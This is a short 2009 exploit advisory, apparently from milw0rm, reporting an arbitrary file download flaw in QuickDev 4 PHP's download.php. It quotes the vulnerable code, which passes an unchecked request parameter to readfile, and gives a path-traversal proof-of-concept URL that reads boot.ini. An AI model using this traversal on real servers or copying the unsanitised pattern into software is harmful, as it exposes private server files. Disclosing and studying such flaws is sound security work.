@@ -1,0 +1,36 @@
+#####################################################################################
+[+] QuickDev 4 Php (download.php file) Arbitrary File Download
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+#####################################################################################
+
+[+] Download : http://sourceforge.net/projects/quickdev4php/files/
+
+[+] Arbitrary File Download
+
+ - Vulnerable code in download.php
+
+--------------------------------------------------------------------------
+
+$file = $_SERVER["DOCUMENT_ROOT"]. $_REQUEST['file'];
+header("Pragma: public");
+header("Expires: 0");
+header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+
+header("Content-Type: application/force-download");
+header( "Content-Disposition: attachment; filename=".basename($file));
+
+//header( "Content-Description: File Transfer");
+@readfile($file);
+die();
+
+--------------------------------------------------------------------------
+
+ - PoC
+
+   http://127.0.0.1/download.php?file=../../../../../../boot.ini
+
+#####################################################################################
+
+# milw0rm.com [2009-08-03]
